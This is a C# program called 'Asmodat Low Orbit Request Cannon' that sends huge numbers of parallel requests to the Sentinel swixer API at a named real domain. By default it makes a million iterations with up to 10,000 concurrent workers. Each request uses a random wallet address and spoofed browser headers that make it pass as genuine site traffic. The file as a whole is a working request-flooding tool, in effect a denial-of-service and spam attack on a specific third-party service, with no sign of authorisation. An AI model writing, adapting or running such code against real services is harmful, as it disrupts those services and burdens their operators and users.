using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using AsmodatStandard.Extensions;

namespace AsmodatLowOrbitRequestCannon
{
    public class Payload
    {
        public Payload(string address)
        {
            client_address = address;
        }

        public string client_address;
        public int delay_in_seconds = 60;
        public string destination_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
        public string from_symbol = "SENT";
        public string node_address = "0x47bd80a152d0d77664d65de5789df575c9cabbdb";
        public string to_symbol = "SENT";
    }

    public class Swix
    {
        public bool success;
        public string address;
        public string swix_hash;
    }

    public class SwixRsponse
    {
        public bool success;
        public int? status;
        public object[] tx_infos;
        public object remaining_amount;
    }

    class Program
    {
        private readonly static object _locker = new object();

        private static string _requestUrl1 = "https://api.swixer.sentinelgroup.io/swix";
        private static string _requestUrl2 = "https://api.swixer.sentinelgroup.io/swix/status?hash=";

        private readonly static (string, string)[] _headers = new(string, string)[] {
            ("Accept-Encoding", "gzip, deflate, br"),
                ("Accept-Language", "en-US,en;q=0.9,cs-CZ;q=0.8,cs;q=0.7,pl-PL;q=0.6,pl;q=0.5"),
                ("Accept-Encoding", "gzip, deflate, br"),
                ("Connection", "keep-alive"),
                ("DNT", "1"),
                ("Host", "api.swixer.sentinelgroup.io"),
                ("Origin", "https://swixer.sentinelgroup.io"),
                ("Referer", "https://swixer.sentinelgroup.io/"),
                ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36")
        };

        static void Main(string[] args)
        {
            int intensity2 = args.Length > 1 ? args[1].ToIntOrDefault(60) : 60;
            int intensity1 = (args.Length > 0 ? args[0].ToIntOrDefault(1000000) : 1000000) / intensity2;
            Console.WriteLine("Asmodat Low Orbit Request Cannon v0.1");
            Console.WriteLine($"Iterations: {intensity1 * intensity2}, Intensity: {intensity2}");
            Run(intensity1, intensity2);
            Console.WriteLine("Done");
        }

        private static void Run(int intensity1, int intensity2)
        {
            var sw = Stopwatch.StartNew();
            int sCounter = 0;
            int fCOunter = 0;
            string lastException = "";
            Parallel.For(0, intensity1, new ParallelOptions() { MaxDegreeOfParallelism = 10000 }, i => {

                async Task RunAsync()
                {
                    bool success;
                    try
                    {
                        success = await Swix();

                        lock (_locker)
                        {
                            if (success)
                                ++sCounter;
                            else
                                ++fCOunter;
                        }
                    }
                    catch(Exception ex)
                    {
                        lock (_locker)
                            ++fCOunter;

                        lastException = ex.JsonSerializeAsPrettyException(Newtonsoft.Json.Formatting.Indented);
                    }
                }

                var collection = new Task[intensity2];
                for (int i2 = 0; i2 < collection.Length; i2++)
                    collection[i2] = RunAsync();

                Task.WaitAll(Task.WhenAll(collection));

                Console.WriteLine($"\n[{sw.ElapsedMilliseconds/1000} s] Success: {sCounter}, Failed: {fCOunter}, Total: {sCounter + fCOunter}, Last Error: {lastException}");
            });
        }
        
        private static async Task<bool> Swix()
        {
            using (var client = new HttpClient() { Timeout = TimeSpan.FromMinutes(60) })
            {
                var content = new StringContent(new Payload($"0x{RandomEx.NextHexString(40)}").JsonSerialize(), encoding: Encoding.UTF8);
                var response = await client.POST(_requestUrl1, content, System.Net.HttpStatusCode.OK, false, _headers);
                var check = await client.GET($"{_requestUrl2}{response.JsonDeserialize<Swix>().swix_hash}", System.Net.HttpStatusCode.OK);
                return check.JsonDeserialize<SwixRsponse>().success;
            }
        }
    }
}
